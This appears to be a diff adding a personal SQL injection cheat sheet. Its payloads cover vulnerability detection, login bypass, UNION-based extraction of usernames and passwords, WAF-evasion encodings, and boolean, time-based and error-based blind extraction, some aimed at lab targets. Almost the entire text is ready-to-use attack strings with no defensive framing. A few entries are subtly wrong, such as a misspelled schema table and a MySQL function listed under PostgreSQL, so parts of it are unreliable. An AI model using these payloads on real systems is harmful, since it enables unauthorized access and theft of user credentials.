@@ -1,0 +1,110 @@
+Comments:
+Oracle     	--comment
+Microsoft 	--comment  /*comment*/
+PostgreSQL 	--comment  /*comment*/
+MySQL     	#comment  -- comment [Note the space after the double dash]   /*comment*/  
+                                                                                    
+Database version:
+ Oracle 	SELECT banner FROM v$version  |  SELECT version FROM v$instance
+Microsoft 	SELECT @@version
+PostgreSQL 	SELECT version()
+MySQL 	SELECT @@version 
+
+Listing the contents of the database:
+SELECT schema_name FROM information_schema.shemata  
+SELECT table_name FROM information_schema.tables where table_schema='xx'
+SELECT column_name FROM information_schema.columns where table_name='xx'
+
+                                                                                   IN-BAND INJECTION:
+                                                                                    
+ERROR-BASED INJECTION:                                                                                    
+Detecting the vulnerability:
+'
+“
+‘)
+‘))
+“))
+/
+;
+//
+\
+-- -  
+\'
+--+
+-1
+)'  
++--+
+[]
+[
+]
+
+Login Bypassing:
+admin’    #
+admin”    #
+admin’))    #
+‘ or 1=1    --+
+‘ or 1=1    #
+" or "        " "
+" or true    --
+" or true    --+
+‘)) or true    -- -
+admin'  or 1=1 or ''='
+admin') or ('1'='1'--
+admin') or '1'='1'/*
+admin") or "1"="1
+') or ('1'='1    --  
+' or 9=9 -- -
+' or 0x47=0x47   
+or char(32)=''
+or 9 is not null
+
+
+Union Based:
+sql function for retreving data from databases:
+group_concat()
+(username,':',password, SEPARATOR '<br>') 
+1 /*union*/union /*select*/select+1,2,3/* -- -
+1 /*uniXon*/union /*selXect*/select+1,2,3/* -- -
+' union ALL SELECT -- - 
+' uNIon seLECt 1,2,3,4 -- -
+15&nbsp;UNIunionon SELselctECT 1,2,3,4 -- -
+1%252f%252a*/union%252f%252a/select 1,2,3,4 -- -
+15/*!u%6eion*//*!se%6cect*/1,2,3,4 -- -\
+
+
+
+Determining the number of columns required in a SQL injection UNION attack:
+' ORDER BY 1--  |  ' ORDER BY 2--  |  ' ORDER BY 3--  etc.  
+' UNION SELECT NULL--  |  ' UNION SELECT NULL,NULL--  |  ' UNION SELECT NULL,NULL,NULL--  etc.  
+
+Finding columns with a useful data type in a SQL injection UNION attack:
+' UNION SELECT 'a',NULL,NULL,NULL--  |  ' UNION SELECT NULL,'a',NULL,NULL--  |  ' UNION SELECT NULL,NULL,'a',NULL--  |  ' UNION SELECT NULL,NULL,NULL,'a'-- 
+  
+Using a SQL injection UNION attack to retrieve interesting data:  
+' UNION SELECT username, password FROM users--  
+Retrieving multiple values within a single column:
+' UNION SELECT username || '~' || password FROM users--
+  
+                                                                                   BLIND INJECTION:
+    
+Extracting sensitive data via verbose SQL error messages:   
+Microsoft    ' and CAST((SELECT example_column FROM example_table) AS int) --       |       ' AND 1=CAST((SELECT password FROM users limit 1) AS int)--         
+PostgreSQL 	 ' and SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+
+Boolean Based:
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+
+time based:
+admin123' UNION SELECT SLEEP(5);--
+admin123' UNION SELECT SLEEP(5),2;--
+admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+admin123' UNION SELECT sleep(5),2 FROM information_schema.tables WHERE table_schema like 'sqli_%r%' and table_name like 'a%';--
+
+Extracting sensitive data via SQL error messages:   
+confirming that there is a table called users -                          TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a' -- -
+confirming that there is a user called administrator -                   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a -- -
+confirming that the password is greater than 1 character in length -     xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a -- -
+test the first letter against a specific value -                         xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a -- -
